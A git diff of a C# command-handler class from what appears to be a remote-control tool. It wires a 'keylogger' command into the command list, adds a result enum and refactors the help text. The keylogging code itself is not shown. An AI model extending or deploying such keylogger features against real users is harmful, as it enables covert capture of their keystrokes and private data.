@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using KeyLogger;
 using Shared;
 
 namespace Commands
@@ -11,6 +12,13 @@ namespace Commands
         /// List of all Command classes
         /// </summary>
         public static List<ICommand> commandList;
+
+        public enum PreProcessResult
+        {
+            OK,
+            KO,
+            NoClientProcess
+        }
 
 
         /// <summary>
@@ -76,7 +84,7 @@ namespace Commands
             int dummy;  // Only for use of int.TryParse()
             var argsType = arguments.Select(s => int.TryParse(s, out dummy) ? typeof(int) : typeof(string)).ToList();
 
-            return commandList.Count(w => w.validArguments.All(a => a.SequenceEqual(argsType))) != 0;
+            return command.validArguments.Count(a => a.SequenceEqual(argsType)) != 0;
         }
 
 
@@ -85,11 +93,7 @@ namespace Commands
         /// the help message is composed of the Command's description and its syntaxHelper
         /// </summary>
         /// <param name="command">Command to show the help for</param>
-        public static void ShowCommandHelp(ICommand command)
-        {
-            ColorTools.WriteMessage(command.description);
-            ColorTools.WriteMessage($"\nSyntax : {command.syntaxHelper}");
-        }
+        public static void ShowCommandHelp(ICommand command) => ColorTools.WriteMessage($"{command.description}\n---------------\nSyntax : {command.syntaxHelper}");
 
 
         /// <summary>
@@ -97,11 +101,24 @@ namespace Commands
         /// </summary>
         public static void ShowGlobalHelp()
         {
-            ColorTools.WriteMessage("--Global help--");
+            ColorTools.WriteMessage("--- Global help ---");
             foreach (var command in commandList)
             {
+                Console.WriteLine("");
                 ShowCommandHelp(command);
             }
+        }
+
+
+        /// <summary>
+        /// Find the ICommand keylogger in the commandList and give it the KeyLoggerManager instance
+        /// This method should only be called by the MainWindow
+        /// </summary>
+        /// <param name="manager">KeyLoggerManager instance</param>
+        public static void PassKeyloggerManagerInstance(KeyLoggerManager manager)
+        {
+            var keyloggerCommandInstance = (KeyLogger)commandList.Find(x => x.name == "keylogger");
+            keyloggerCommandInstance.GetKeyLoggerManagerInstance(manager);
         }
     }
 }
